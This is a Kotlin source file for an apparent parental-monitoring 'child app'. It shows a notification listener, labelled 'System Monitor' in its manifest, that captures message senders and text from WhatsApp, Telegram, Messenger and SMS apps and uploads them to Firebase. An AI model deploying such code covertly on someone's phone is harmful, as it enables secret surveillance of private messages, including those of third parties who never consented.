/**
 * Android Child App (Client Agent)
 * 
 * Implementation Details:
 * 1. Background Service: Foreground service to ensure persistence.
 * 2. Notification Listener: Intercepts WhatsApp, Telegram, etc.
 * 3. Firebase Sync: Pushes data to Realtime Database.
 */

// --- AndroidManifest.xml Requirements ---
/*
<service android:name=".NotificationService"
    android:label="System Monitor"
    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
    android:exported="true">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>

<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
*/

package com.guardian.child

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.app.Notification
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

class NotificationService : NotificationListenerService() {

    private val database = FirebaseDatabase.getInstance().reference

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        
        val title = extras.getString(Notification.EXTRA_TITLE)
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
        
        if (title != null && text != null) {
            // Filter common chat apps
            if (isChatApp(packageName)) {
                syncToFirebase(packageName, title, text)
            }
        }
    }

    private fun isChatApp(packageName: String): Boolean {
        val chatApps = listOf(
            "com.whatsapp",
            "org.telegram.messenger",
            "com.facebook.orca", // Messenger
            "com.android.mms",    // SMS
            "com.google.android.apps.messaging" // Google Messages
        )
        return chatApps.contains(packageName)
    }

    private fun syncToFirebase(packageName: String, sender: String, message: String) {
        val deviceId = "child_device_01" // Should be dynamic
        val messageData = mapOf(
            "sender" to sender,
            "text" to message,
            "packageName" to packageName,
            "timestamp" to System.currentTimeMillis()
        )
        
        database.child("devices").child(deviceId).child("messages").push().setValue(messageData)
            .addOnSuccessListener {
                Log.d("NotificationService", "Message synced successfully")
            }
            .addOnFailureListener {
                Log.e("NotificationService", "Sync failed: ${it.message}")
            }
    }
}
